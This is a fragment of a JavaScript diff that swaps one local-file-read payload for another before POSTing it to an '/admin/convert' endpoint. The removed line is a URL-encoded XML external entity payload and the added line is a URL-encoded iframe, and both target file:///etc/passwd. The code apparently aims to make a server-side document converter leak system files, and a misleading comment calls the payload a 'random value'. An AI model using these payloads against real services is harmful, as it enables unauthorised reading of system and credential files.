@@ -1,4 +1,4 @@
-const htmlCode = "%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20test%20SYSTEM%20%27file%3A%2F%2F%2Fetc%2Fpasswd%27%3E%5D%3E%3Croot%3E%26test%3B%3C%2Froot%3E"; // Set the random value to send
+const htmlCode = "%3Ciframe%20src%3Dfile%3A%2F%2F%2Fetc%2Fpasswd%20width%3D500%20height%3D500%3E%3C%2Fiframe%3E"; // Set the random value to send
 const xhr = new XMLHttpRequest(); // Create a new XMLHttpRequest object
 xhr.open("POST", "/admin/convert"); // Set the request method and endpoint
 xhr.setRequestHeader("Content-Type", "application/json"); // Set the request header
